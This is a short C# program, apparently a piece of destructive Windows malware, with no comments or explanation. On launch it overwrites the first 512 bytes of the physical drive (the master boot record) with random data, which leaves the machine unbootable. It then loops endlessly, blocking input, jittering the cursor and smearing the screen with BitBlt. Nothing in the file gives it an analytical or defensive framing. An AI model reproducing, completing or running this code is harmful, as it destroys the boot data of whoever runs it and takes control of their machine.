using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

class lhwbe
{
    [DllImport("user32.dll")]
    private static extern bool GetCursorPos(out POINT lpPoint);

    [DllImport("user32.dll")]
    private static extern bool SetCursorPos(int X, int Y);

    [DllImport("user32.dll")]
    private static extern bool BlockInput(bool blockIt);

    [DllImport("user32.dll")]
    private static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern void ReleaseDC(IntPtr hWnd, IntPtr hdc);

    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(int nIndex);

    [DllImport("gdi32.dll")]
    private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
                                       IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

    private const int SM_CXSCREEN = 0;
    private const int SM_CYSCREEN = 1;
    private const uint SRCCOPY = 0x00CC0020;

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT
    {
        public int X;
        public int Y;
    }

    static void Main()
    {
        Random rand = new Random();
        POINT cursor;

        OverwriteMBR();

        while (true)
        {
            GetCursorPos(out cursor);
            int X = cursor.X + rand.Next(-1, 2);
            int Y = cursor.Y + rand.Next(-1, 2);

            BlockInput(true);
            SetCursorPos(X, Y);

            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(SM_CXSCREEN);
            int h = GetSystemMetrics(SM_CYSCREEN);
            int rx = rand.Next(w);

            BitBlt(hdc, rx, 20, 200, h, hdc, rx, -3, SRCCOPY);

            ReleaseDC(IntPtr.Zero, hdc);

            Thread.Sleep(5);
            BlockInput(false);
        }
    }

    static void OverwriteMBR()
    {
        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
        {
            byte[] mbrData = new byte[512];
            Random rand = new Random();
            rand.NextBytes(mbrData);
            fs.Write(mbrData, 0, mbrData.Length);
        }
    }
}
